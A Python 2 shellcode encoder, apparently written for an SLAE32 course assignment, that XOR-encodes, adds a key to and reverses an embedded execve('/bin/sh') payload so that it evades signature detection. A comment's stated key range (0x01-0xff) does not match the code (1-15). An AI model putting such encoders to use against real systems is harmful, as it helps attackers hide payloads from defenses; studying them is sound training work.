#!/usr/bin/python
# File : XORAddReverse-encode-bruteforce.py
# Author : Sunt-tanarit Prapassaraporn (BlackDragon)
# Purpose : Assignment #4 of Securitytube Linux Assembly Expert 32bit (SLAE32)
# Student ID: SLAE-XXX
# Remark : The shellcode to be encoded need to be hardcoded.

#                         --- Function of the code ---
# This encoder will XOR pseudo-randomly generated "VALUE" to individual byte of shellcode, this
# "VALUE" can be considered a KEY. After that, this KEY, again, will be added(+) to each byte
# of shellcode. Finally the order of the encoded shellcode will be reversed.

# The KEY will be pseudo-randomly generated (0x01 - 0xff), a weak one, absolutely, to reduce
# the time used for decoding.

# The docoder stub will reverse the encoded shellcode to its original order,
# try to bruteforce the KEY at runtime, subtract the KEY from each byte of the shellcode, 
# xor it back, and then execute the shellcode.

# For this technique to be effective, a maker value "0xD3"+KEY will be appended to the
# encoded shellcode.

# [!!!] To avoid overflow possibility, the byte value 0xf1 - 0xff will be skipped at 
# the addition stage.

from sys import *
from random import randint 

key = randint(1,15)

shellcode = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" #execve("/bin/sh",["/bin/sh",""],"")
string = ""
csbyte = ""

for b in bytearray(shellcode):
	b = b^key # XOR with KEY.
	if(b > 0xf0): # To avoid overflow.
		b=b
	else:
		b += key #Addition

	string = ''.join(("\\x%02x"%b,string)) #Reverse the shellcode.
	csbyte = ''.join(("0x%02x,"%b,csbyte)) #Reverse the shellcode.

print "\nKey : 0x%02x" %key
print "Length : %d + 1 (marker)"%len(shellcode)
print "Encoded Hex String format : "+string+"\\x%02x" %(0xd3+key)		 	# Reverse the order and add a marker.
print "Encoded Comma Separated byte format : "+csbyte+"0x%02x" %(0xd3+key) 	# Same.
print "\n"
